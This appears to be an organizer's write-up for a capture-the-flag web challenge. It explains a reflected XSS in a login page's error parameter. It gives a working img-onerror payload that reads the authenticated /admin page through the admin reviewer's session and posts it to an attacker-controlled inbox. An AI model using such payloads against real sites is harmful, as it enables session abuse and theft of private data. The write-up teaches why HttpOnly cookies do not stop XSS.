# Organizer write-up

`GET /login?error=...` inserts the `error` value directly into an alert. The admin reviewer accepts only same-origin paths and visits them with an `HttpOnly` `session` cookie. `HttpOnly` prevents `document.cookie` access, but browser requests still include the cookie.

1. On `/support`, create an inbox and copy its 24-character ID.
2. Build an XSS payload (replace `INBOX_ID`):

```html
<img src=x onerror="fetch('/admin').then(r=>r.text()).then(x=>fetch('/api/inboxes/INBOX_ID/messages',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message:x})}))">
```

3. URL-encode it as the `error` value and report the resulting path:

```text
/login?error=%3Cimg%20src%3Dx%20onerror%3D%22fetch(...payload...)%22%3E
```

4. Open the inbox after the reviewer finishes. Its message contains the authenticated `/admin` HTML and the flag.

The intended lesson is that `HttpOnly` limits cookie theft but does not stop XSS from performing authenticated same-origin actions or reading same-origin responses.
